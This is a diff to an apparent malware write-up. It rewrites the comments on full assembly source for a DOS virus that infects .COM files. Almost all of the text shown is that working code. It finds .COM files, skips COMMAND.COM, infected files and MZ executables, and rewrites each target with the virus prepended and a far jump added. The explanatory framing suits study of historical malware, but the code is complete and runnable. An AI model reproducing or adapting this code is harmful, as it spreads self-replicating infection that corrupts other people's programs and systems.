@@ -24,120 +24,120 @@ https://www.virustotal.com/gui/file/c17dc774329fda62b91c2d30034836d5d864540cff12
 ```asm
 .model  tiny
 .code
-org     100h         ; Entry point for .COM file (loads at CS:0100)
+org     100h         ; Entry point for .COM file (starts at CS:0100h)
 
-kkk:                ; Virus start
+kkk:                 ; Start of the virus
 
-    nop             ; Infection marker: NOP NOP (90 90)
+    nop             ; Infection marker: NOP NOP (bytes 90 90)
     nop
 
-    ; Save command-line parameters
-    mov     cx,80h
-    mov     si,0080h
-    mov     di,0ff7fh
-    rep     movsb               ; Save 128 bytes from 0x80 to 0xFF7F
+    ; Save command-line parameters (from PSP:80h, 128 bytes)
+    mov     cx,80h                  ; Set counter to 128 bytes
+    mov     si,0080h                ; Source = PSP command-line buffer
+    mov     di,0ff7fh               ; Destination = safe zone (0FF7Fh)
+    rep     movsb                   ; Copy parameters to safe zone
 
-    ; Calculate virus size
-    lea     ax,begp             ; AX ← end of virus
+    ; Calculate the virus size
+    lea     ax,begp                ; AX = address just after virus
     mov     cx,ax
-    sub     ax,100h             ; Virus length = end - 0x100
-    mov     ds:[0fah],ax        ; Store virus length at 0xFA
+    sub     ax,100h                ; Virus size = end - start
+    mov     ds:[0fah],ax           ; Store virus size at memory offset 0FAh
 
-    ; Setup memory buffers
-    add     cx,fso              ; CX ← buffer start (virus + file)
-    mov     ds:[0f8h],cx        ; Write buffer
+    ; Set up read/write memory buffers
+    add     cx,fso                 ; Add some extra space for safety
+    mov     ds:[0f8h],cx           ; Store write buffer address at 0F8h
     add     cx,ax
-    mov     ds:[0f6h],cx        ; Read buffer
+    mov     ds:[0f6h],cx           ; Store read buffer address at 0F6h
 
-    ; Copy virus to buffer
-    mov     cx,ax
-    lea     si,kkk
-    mov     di,ds:[0f8h]
-RB: rep     movsb               ; Copy virus to memory buffer
+    ; Copy the virus to the memory buffer
+    mov     cx,ax                  ; CX = virus size
+    lea     si,kkk                 ; SI = start of virus
+    mov     di,ds:[0f8h]           ; DI = destination buffer
+RB: rep     movsb                  ; Copy virus into memory
 
-    stc                         ; Set Carry Flag
+    stc                            ; Set carry flag (used by int 21h)
 
-    ; Find first *.COM file
-    lea     dx,fff
-    mov     ah,4Eh
-    mov     cx,20H              ; Archive attribute
+    ; Find first *.COM file in current directory
+    lea     dx,fff                 ; DX = "*.COM" search mask
+    mov     ah,4Eh                 ; DOS interrupt: Find First File
+    mov     cx,20H                 ; File attribute: archive
     int     21h
 
     or      ax,ax
-    jz      LLL
-    jmp     done
+    jz      LLL                    ; If success, jump to loop
+    jmp     done                   ; If no file found, exit
 
 LLL:
-    ; Get current DTA pointer
+    ; Get current DTA (Disk Transfer Area) address
     mov     ah,2Fh
-    int     21h                 ; ES:BX ← DTA address
+    int     21h                    ; ES:BX = DTA pointer
 
-    ; Read file size
-    mov     ax,es:[bx+1ah]
-    mov     ds:[0fch],ax
+    ; Get file size from DTA
+    mov     ax,es:[bx+1ah]         ; File size
+    mov     ds:[0fch],ax           ; Save file size at 0FCh
 
-    add     bx,1eh              ; BX ← filename pointer
-    mov     ds:[0feh],bx
+    add     bx,1eh                 ; BX = pointer to filename in DTA
+    mov     ds:[0feh],bx           ; Save pointer at 0FEh
 
     ; Skip files starting with "CO" (e.g., COMMAND.COM)
-    mov     ax,'OC'             ; Little-endian 'CO' = 'OC'
-    sub     ax,ds:[009eh]
-    je      fin
+    mov     ax,'OC'                ; "CO" in little-endian
+    sub     ax,ds:[009eh]          ; Compare with filename's first 2 letters
+    je      fin                    ; If match, skip file
 
-    ; Ensure new file won't exceed memory limits
+    ; Ensure file + virus size won't exceed memory limits
     add     ax,180h
-    add     ax,ds:[0fah]
+    add     ax,ds:[0fah]           ; Add virus size
     add     ax,fso
-    cmp     ax,0fff0h
-    ja      fin
+    cmp     ax,0fff0h              ; Check against max allowed
+    ja      fin                    ; Too large → skip file
 
-    ; Open file for R/W
+    ; Open the file for reading & writing
     clc
-    mov     ax,3d02h
-    mov     dx,bx
+    mov     ax,3d02h               ; DOS: open file R/W (3D function)
+    mov     dx,bx                  ; DX = pointer to filename
+    int     21h                    ; Open file
+
+    ; Read contents into buffer
+    mov     bx,ax                  ; BX = file handle
+    mov     ah,3fh                 ; Function: read file
+    mov     cx,ds:[0fch]           ; Size to read
+    mov     dx,ds:[0f6h]           ; Destination buffer
     int     21h
 
-    ; Read file
-    mov     bx,ax
-    mov     ah,3fh
-    mov     cx,ds:[0fch]
-    mov     dx,ds:[0f6h]
-    int     21h
-
-    ; Check infection marker
+    ; Check for infection marker (90 90)
     mov     bx,dx
     mov     ax,[bx]
     sub     ax,9090h
-    jz      fin
+    jz      fin                    ; Already infected → skip
 
-    ; Check for "MZ" executable
+    ; Check if file is MZ executable (EXE file)
     mov     al,'M'
     mov     di,dx
     mov     cx,ds:[0fch]
-    repne   scasb
-    jne     cont
+    repne   scasb                  ; Look for 'M'
+    jne     cont                   ; Not found → continue
     mov     al,'Z'
-    cmp     es:[di],al
-    je      fin
+    cmp     es:[di],al             ; Check if next is 'Z'
+    je      fin                    ; "MZ" header found → skip file
 
 cont:
-    ; Store original size before buffer
+    ; Save original file size just before the buffer
     mov     ax,ds:[0fch]
     mov     bx,ds:[0f6h]
-    mov     [bx-2],ax
+    mov     [bx-2],ax              ; Store at [buffer-2]
 
-    ; Create new infected file
-    mov     ah,3ch
-    mov     cx,00h
-    mov     dx,ds:[0feh]
+    ; Create new infected file (overwrite the original)
+    mov     ah,3ch                 ; Create file
+    mov     cx,00h                 ; Normal attribute
+    mov     dx,ds:[0feh]           ; Filename
     clc
     int     21h
 
-    mov     bx,ax
-    mov     ah,40h
-    mov     cx,ds:[0fch]
-    add     cx,ds:[0fah]
-    mov     dx,ds:[0f8h]
+    mov     bx,ax                  ; BX = new file handle
+    mov     ah,40h                 ; Write to file
+    mov     cx,ds:[0fch]           ; Original file size
+    add     cx,ds:[0fah]           ; + virus size
+    mov     dx,ds:[0f8h]           ; Buffer with virus + file
     int     21h
 
     ; Close file
@@ -145,49 +145,53 @@ cont:
     int     21h
 
 FIN:
-    ; Find next file
+    ; Find next *.COM file
     stc
-    mov     ah,4fh
+    mov     ah,4fh                 ; Find Next File
     int     21h
 
     or      ax,ax
-    jnz     done
-    jmp     LLL
+    jnz     done                   ; No more files → exit
+    jmp     LLL                    ; Continue with next file
 
 DONE:
-    ; Restore command-line params
+    ; Restore command-line parameters from earlier
     mov     cx,80h
     mov     si,0ff7fh
     mov     di,0080h
     rep     movsb
 
-    ; Set FAR JMP at memory top
-    mov     ax,0A4F3H
+    ; Patch a FAR JMP instruction at top of memory (FFF9h)
+    mov     ax,0A4F3H              ; Segment part of JMP FAR
     mov     ds:[0fff9h],ax
-    mov     al,0eah
+    mov     al,0eah                ; Opcode for JMP FAR
     mov     ds:[0fffbh],al
-    mov     ax,100h
+    mov     ax,100h                ; Offset part
     mov     ds:[0fffch],ax
 
+    ; Store segment and setup for later
     lea     si,begp
     lea     di,kkk
     mov     ax,cs
-    mov     ds:[0fffeh],ax
+    mov     ds:[0fffeh],ax         ; Segment for JMP
     mov     kk,ax
     mov     cx,fso
 
-    db      0eah
-    dw      0fff9h
-kk  dw      0000h
+    ; Actual bytes for JMP FAR instruction
+    db      0eah                   ; JMP FAR opcode
+    dw      0fff9h                 ; Offset to jump to
+kk  dw      0000h                  ; Segment (will be replaced earlier)
 
-fff     db  '*?.com',0
-fso     dw  0005h
+fff     db  '*?.com',0             ; File search pattern
+fso     dw  0005h                  ; Additional offset (buffer space)
 
 begp:
+    ; Clean program termination
     mov     ax,4C00h
     int     21h
 
 end kkk
+
 ```
 
 ## Techniques Used
